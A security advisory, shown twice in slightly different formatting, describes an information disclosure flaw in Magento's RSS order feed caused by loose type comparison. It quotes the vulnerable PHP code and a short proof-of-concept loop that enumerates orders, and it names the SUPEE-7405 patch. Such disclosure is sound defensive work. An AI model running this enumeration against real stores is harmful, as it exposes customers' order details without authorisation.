------------------------------------------------------------------
Magento <= 1.9.2.2 (RSS Feed) Information Disclosure Vulnerability
------------------------------------------------------------------

[-] Software Link:

<http://magento.com/>

[-] Affected Versions:

Version 1.9.2.2 and prior versions.

[-] Vulnerability Description:

The vulnerability is located in the /app/code/core/Mage/Rss/Helper/Order.php script,
specifically into the getOrderByStatusUrlKey method of the Mage_Rss_Helper_Order
class, which is the method being called when dispatching RSS feed requests:

83.         public function getOrderByStatusUrlKey($key)
84.         {
85.             $data = json_decode(base64_decode($key), true);
86.             if (!is_array($data) || !isset($data['order_id']) || !isset($data['increment_id'])
87.                 || !isset($data['customer_id'])
88.             ) {
89.                 return null;
90.             }
91.
92.             /** @var $order Mage_Sales_Model_Order */
93.             $order = Mage::getModel('sales/order')->load($data['order_id']);
94.             if ($order->getId()
95.                 && $order->getIncrementId() == $data['increment_id']
96.                 && $order->getCustomerId() == $data['customer_id']
97.             ) {
98.                 return $order;
99.             }
100.
101.            return null;
102.        }

User input passed through the "data" request parameter is being base64-decoded and then JSON-decoded
at line 85, and its "increment_id" and "customer_id" parameters are used to match the same values of
the order object retrieved at line 93. After that, if everything is matched correctly, then the $order
object will be returned by the getOrderByStatusUrlKey method for displaying within the RSS feed as XML
data. The vulnerability exists because of an unsafe way of comparing those parameters, due to comparison
operator == is being used instead of === within the "if" statement at lines 95-96. The latter operator
returns "true" only if the compared values are equal and the same type, while the first compare the values
after "type juggling". Because of this behavior, an attacker might be able to download order comments and
other order-related information by using a PHP script like the following, which will try to enumerate the
details of the first 100 orders:

for ($i = 1; $i <= 100; $i++)
{
    print "[-] Retrieving order ID $i\n";

    $data = array('order_id' => $i, 'increment_id' => true, 'customer_id' => true)
    $data = base64_encode(json_encode($data));
    $_xml = http_get("http://[HOST]/magento/index.php/rss/order/status?data={$data}";);

    print parse_magento_rss_order($_xml);
}

[-] Solution:

Update to a fixed version or apply the SUPEE-7405 patch bundle:

# Magento <= 1.9.2.2 (RSS Feed) Information Disclosure Vulnerability

#### â¢ Software Link:

<https://magento.com>

#### â¢ Affected Versions:

Version 1.9.2.2 and prior versions.

#### â¢ Vulnerability Description:

The vulnerability is located in the **/app/code/core/Mage/Rss/Helper/Order.php** script, specifically into the `getOrderByStatusUrlKey()` method of the `Mage_Rss_Helper_Order` class, which is the method being called when dispatching RSS orders' feed requests:

```
 83public function getOrderByStatusUrlKey($key)
 84{
 85    $data = json_decode(base64_decode($key), true);
 86    if (!is_array($data) || !isset($data['order_id']) || !isset($data['increment_id'])
 87        || !isset($data['customer_id'])
 88    ) {
 89        return null;
 90    }
 91
 92    /** @var $order Mage_Sales_Model_Order */
 93    $order = Mage::getModel('sales/order')->load($data['order_id']);
 94    if ($order->getId()
 95        && $order->getIncrementId() == $data['increment_id']
 96        && $order->getCustomerId() == $data['customer_id']
 97    ) {
 98        return $order;
 99    }
100
101    return null;
102}
```

User input passed through the **“data”** request parameter is being base64-decoded and then JSON-decoded at line 85, and its **“increment\_id”** and **“customer\_id”** parameters are used to match the same values of the order object retrieved at line 93. After that, if everything is matched correctly, then the $order object will be returned by the `getOrderByStatusUrlKey()` method for displaying within the RSS feed as XML data. The vulnerability exists because of an unsafe way of comparing those parameters, due to comparison operator `==` is being used instead of `===` within the âifâ statement at lines 95-96. The latter operator returns *true* only if the compared values are equal and the same type, while the first compare the values after âtype jugglingâ. Because of this behavior, a remote unauthenticated attacker might be able to download order comments and other order-related information by using a PHP script like the following, which will try to enumerate the details of the first 100 orders:

```
 1for ($i = 1; $i <= 100; $i++)
 2{
 3    print "[-] Retrieving order ID $i\n";
 4
 5    $data = array('order_id' => $i, 'increment_id' => true, 'customer_id' => true);
 6    $data = base64_encode(json_encode($data));
 7    $_xml = http_get("http://[HOST]/magento/index.php/rss/order/status?data={$data}");
 8
 9    print parse_magento_rss_order($_xml);
10}
```
